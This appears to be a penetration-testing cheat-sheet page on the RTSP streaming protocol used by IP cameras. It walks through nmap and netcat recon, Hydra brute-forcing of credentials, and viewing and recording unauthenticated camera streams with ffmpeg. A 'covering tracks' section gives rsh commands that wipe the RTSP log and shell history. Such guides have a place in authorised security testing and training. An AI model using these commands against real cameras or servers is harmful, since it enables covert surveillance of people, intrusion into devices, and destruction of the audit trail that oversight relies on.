# RTSP

**`Default Port: 554`**

**RTSP (Real-Time Streaming Protocol)** is a network protocol used to control multimedia streams such as audio and video. RTSP is commonly used for controlling live streams in devices like IP cameras and media servers.

### Connect <a href="#connect" id="connect"></a>

#### Connecting to an RTSP Service <a href="#connecting-to-an-rtsp-service" id="connecting-to-an-rtsp-service"></a>

Various tools can be used to connect to an RTSP service. For example, **VLC Media Player** or **FFmpeg** are commonly used.

* Open **VLC Media Player**.
* From the `Media` menu, select `Open Network Stream`.
* Enter the RTSP URL in the following format:

```
rtsp://<username>:<password>@<IP-address>:554/<path>
```

```
ffmpeg -i rtsp://<username>:<password>@<IP-address>:554/<path>
```

#### Capturing RTSP Streams <a href="#capturing-rtsp-streams" id="capturing-rtsp-streams"></a>

To capture an RTSP stream, tools like **Wireshark** can be used to monitor the network traffic. You can filter RTSP traffic on port 554 in Wireshark using this filter:

```
tcp.port == 554
```

### Recon <a href="#recon" id="recon"></a>

#### Identifying an RTSP Service <a href="#identifying-an-rtsp-service" id="identifying-an-rtsp-service"></a>

You can use **Nmap** to identify an RTSP service running on a target. To discover services running on port 554, use the following command:

```
nmap -p 554 X.X.X.X
```

This command checks if there is an RTSP service running on the target device.

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

**Netcat** or **Telnet** can be used to grab banners from the RTSP service, which can reveal important information about the service:

```
    nc -nv X.X.X.X 554
    OPTIONS rtsp://X.X.X.X/
```

These commands help retrieve information about the supported commands and potential vulnerabilities.

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### Enumerating RTSP Capabilities <a href="#enumerating-rtsp-capabilities" id="enumerating-rtsp-capabilities"></a>

Once connected to the RTSP service, you can use supported commands to learn about the media files and capabilities. For example, the **DESCRIBE** command helps retrieve information about the available streams:

```
OPTIONS rtsp://<IP-address>:554/
DESCRIBE rtsp://<IP-address>:554/<path>
```

This command reveals details such as media file formats, codecs, and resolutions available in the stream.

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### Credential Brute-Forcing <a href="#credential-brute-forcing" id="credential-brute-forcing"></a>

Brute-forcing login credentials of an RTSP service can be done with tools like **Hydra**:

```
hydra -l <username> -P /path/to/passwords.txt <IP-address> rtsp
```

This command performs a brute-force attack against the RTSP service to find weak credentials.

#### Exploiting Misconfigurations <a href="#exploiting-misconfigurations" id="exploiting-misconfigurations"></a>

RTSP services may be misconfigured, allowing access without authentication. If such a misconfiguration is found, access to streams can be gained directly:

```
ffmpeg -i rtsp://<IP-address>:554/<path>
```

If no authentication is required, the stream can be accessed and data can be extracted easily.

#### Unauthorized Stream Access <a href="#unauthorized-stream-access" id="unauthorized-stream-access"></a>

Some RTSP servers may allow unauthorized users to access live streams due to poor configuration. Once such a vulnerability is identified, you can use a media player or FFmpeg to access the live stream without credentials.

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Capturing and Saving Media Streams <a href="#capturing-and-saving-media-streams" id="capturing-and-saving-media-streams"></a>

Once connected to the RTSP service, media streams can be captured and saved locally. To save an RTSP stream to a file using **FFmpeg**, use this command:

```
ffmpeg -i rtsp://<username>:<password>@<IP-address>:554/<path> -c copy output.mp4
```

This command saves the RTSP stream to `output.mp4`.

#### Persistent Access <a href="#persistent-access" id="persistent-access"></a>

For persistent access, the configuration files or authentication mechanisms of the IP camera or media server can be altered. By modifying configurations, you could potentially maintain continuous access to the RTSP stream.

#### Covering Tracks <a href="#covering-tracks" id="covering-tracks"></a>

Clearing log files and command history is crucial in post-exploitation. If logs are being kept by the server, they can be cleared using appropriate commands:

```
rsh <remote-server-ip> -l <username> echo "" > /var/log/rtsp.log
rsh <remote-server-ip> -l <username> history -c
```

These commands clear the RTSP log and wipe the shell command history, helping to cover tracks.
